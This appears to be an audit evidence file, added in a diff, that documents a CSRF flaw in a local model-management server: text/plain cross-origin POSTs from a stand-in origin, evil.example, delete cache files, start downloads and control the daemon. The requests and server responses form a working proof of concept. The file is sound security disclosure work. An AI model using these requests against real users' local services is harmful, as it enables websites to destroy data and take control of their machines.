@@ -1,0 +1,34 @@
+# Evidence: cross-origin state-changing requests are accepted
+
+Server: production build (server.js, no PROXY_TOKEN), bound to 127.0.0.1.
+
+## 1. Destructive cleanup via a CORS-simple cross-origin POST
+Request:
+  POST /api/cache/cleanup
+  Origin: https://evil.example
+  Sec-Fetch-Site: cross-site
+  Content-Type: text/plain
+  Body: {"targets":["temp"]}
+
+Fixture before: <TMPDIR>/ollama-studio-csrf-proof
+HTTP 200 application/json
+{'freedBytes': 16, 'removed': {'orphan': 0, 'partial': 0, 'temp': 1}, 'skippedRecent': 0, 'errors': []}
+Fixture after: ls: <TMPDIR>/ollama-studio-csrf-proof: No such file or directory
+DELETED
+
+## 2. Start a background download job via the same cross-origin primitive
+Request: POST /api/downloads, Origin: https://evil.example, Content-Type: text/plain
+Body: {"kind":"pull","model":"csrf-audit-model"}
+HTTP 200 application/json
+{'id': 'dl-76594062-9a2b-4048-88e2-29bbe823ca6d', 'kind': 'pull', 'model': 'csrf-audit-model', 'status': 'running'}
+
+## 3. Daemon control with ALLOW_DAEMON_CONTROL=1 (start short-circuits as already running)
+Request: POST /api/daemon/control, Origin: https://evil.example, Content-Type: text/plain
+Body: {"action":"start","confirm":true}
+HTTP 200 application/json; charset=utf-8
+{"ok":true,"action":"start","requested":"start","manager":"ollama-app","already":true}
+
+The daemon loopback check is not a CSRF defense: the browser connects from the
+victim machine to 127.0.0.1, so request.socket.remoteAddress is loopback.
+The Origin and Sec-Fetch-Site headers are never inspected by the server.
+No JSON content-type is required: readJsonBody parses text/plain bodies.
